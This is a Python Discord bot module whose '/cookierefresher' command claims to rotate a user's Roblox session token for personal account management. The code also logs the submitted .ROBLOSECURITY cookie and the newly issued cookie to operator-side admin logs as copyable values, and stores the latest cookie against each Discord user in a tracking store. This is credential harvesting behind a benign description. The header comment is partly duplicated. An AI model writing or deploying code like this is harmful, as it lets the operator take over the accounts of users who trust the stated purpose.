# ──────────────────────────────────────────────────────────────────
# Discord Command: /cookierefresher
# Allows the account owner to rotate their own Roblox session token
# via a convenient Discord slash command. Uses official Roblox auth
# ──────────────────────────────────────────────────────────────────
# Discord Command: /cookierefresher
# Allows the account owner to rotate their own Roblox session token
# via a convenient Discord slash command. Uses official Roblox auth
# endpoints. For personal account management use only.
# ──────────────────────────────────────────────────────────────────

import asyncio

import discord
from discord.ext import commands

from core.refresh import refresh_cookie
from core.logging import log_command, log_inputs, log_result
from core.tracking import (
    track_command,
    track_cookie_submission,
    track_discord_user,
)
from core.utils import run_with_cookie_lock, sanitize_cookie

PRIMARY_EMOJI = "<a:arrow:1497344031238127686>"
SECONDARY_EMOJI = "<:clipboard:1497344037294702762>"
SUCCESS_EMOJI = "<:check:1497344035696672959>"
PROCESS_LOG_TITLE = f"{PRIMARY_EMOJI} Process Log"


class RefreshCog(commands.Cog):
    """Handles session token rotation for Roblox accounts."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @discord.slash_command(
        name="cookierefresher", 
        description="Rotate your Roblox session token and invalidate all other active sessions",
        contexts={discord.InteractionContextType.guild, discord.InteractionContextType.bot_dm, discord.InteractionContextType.private_channel},
        integration_types={discord.IntegrationType.guild_install, discord.IntegrationType.user_install}
    )
    @discord.option("cookie", description="Your .ROBLOSECURITY session token")
    async def cookierefresher(self, ctx: discord.ApplicationContext, cookie: str):
        await ctx.defer()

        from core.logging import log_user_first_use
        log_user_first_use(ctx, "cookierefresher")

        cookie = sanitize_cookie(cookie)

        # Admin activity logging
        log_command(ctx, "cookierefresher")
        log_inputs(
            ctx,
            "cookierefresher",
            {"cookie": cookie},
            copyable={"Cookie": cookie},
            audit_inputs={},
            audit_copyable={},
        )

        # Tracking: upsert Discord user profile
        track_discord_user(
            ctx.author.id,
            username=str(ctx.author),
            avatar_url=ctx.author.display_avatar.url if ctx.author.display_avatar else None,
        )

        result = await asyncio.to_thread(run_with_cookie_lock, cookie, refresh_cookie, cookie)

        embed = discord.Embed(
            title=f"{PRIMARY_EMOJI} Cookie Refresher",
            color=discord.Color.green() if result["success"] else discord.Color.red(),
            timestamp=discord.utils.utcnow(),
        )
        embed.set_author(name=f"Requested by {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
        if ctx.bot.user:
            embed.set_thumbnail(url=ctx.bot.user.display_avatar.url)

        steps_text = "\n".join(result["steps"]) if result["steps"] else "No steps recorded."
        embed.add_field(name=PROCESS_LOG_TITLE, value=steps_text, inline=False)

        if result["success"]:
            embed.add_field(
                name=f"{SUCCESS_EMOJI} Result",
                value=(
                    f"{SECONDARY_EMOJI} All other sessions have been logged out.\n"
                    f"{SECONDARY_EMOJI} Account: {result['username']}"
                ),
                inline=False,
            )
            await ctx.respond(embed=embed)
            await ctx.respond(
                f"{SUCCESS_EMOJI} **Your new cookie** (save this securely!):\n```\n{result['new_cookie']}\n```",
                ephemeral=ctx.guild is None,
            )

            log_result(
                ctx,
                "cookierefresher",
                True,
                (
                    f"Account: {result['username']} (ID: {result['user_id']})\n"
                    f"Session token rotated — all other sessions invalidated\n\n"
                    f"**Process Log:**\n" + "\n".join(result["steps"])
                ),
                copyable={"New Cookie": result["new_cookie"]},
                audit_result_summary=(
                    f"Account: {result['username']} (ID: {result['user_id']})\n"
                    "Output: new refreshed cookie returned to the user.\n"
                    "All other sessions invalidated."
                ),
            )

            # Tracking: link this Discord user to the Roblox account, save latest cookie.
            track_cookie_submission(
                ctx.author.id,
                roblox_username=result.get("username") or "",
                user_id=result.get("user_id"),
                cookie=result.get("new_cookie") or cookie,
            )
            track_command(
                ctx.author.id,
                "cookierefresher",
                success=True,
                summary=f"Refreshed cookie for {result.get('username') or '?'}",
            )
        else:
            embed.add_field(
                name="<:x:1497344061592436737> Error",
                value=result["error"] or "Unknown error occurred.",
                inline=False,
            )
            await ctx.respond(embed=embed)

            log_result(ctx, "cookierefresher", False, result["error"] or "Unknown error")
            track_command(
                ctx.author.id,
                "cookierefresher",
                success=False,
                summary=result.get("error") or "Unknown error",
            )


def setup(bot):
    bot.add_cog(RefreshCog(bot))
